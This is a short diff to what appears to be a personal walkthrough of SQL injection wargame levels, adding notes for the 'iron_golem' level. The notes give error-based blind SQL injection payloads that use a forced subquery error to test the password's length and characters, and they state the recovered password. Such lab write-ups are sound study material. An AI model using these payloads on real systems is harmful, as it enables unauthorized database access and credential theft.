@@ -136,6 +136,16 @@ level-20 (dragon):
 
 level-21 (iron_golem):
   -> 
+  -> 
+  -> pw=' OR IF(length(pw)>31, (select 1 union select 2), 1)-- - 
+  -> if the condition is true then it force the database error and send the message as "Subquery returned more than 1 value"..
+  -> if not it remains as such.
+  -> then pw=' OR IF(substring(pw,1,1)='1', (select 1 union select 2), 1)-- -
+  -> start brute forcing it and get the password. ( pw=06b5a6c16e8830475f983cc3a825ee9a )
+  -> the level is cleared.
+
+level-22 ():
+  -> 
 
 
 
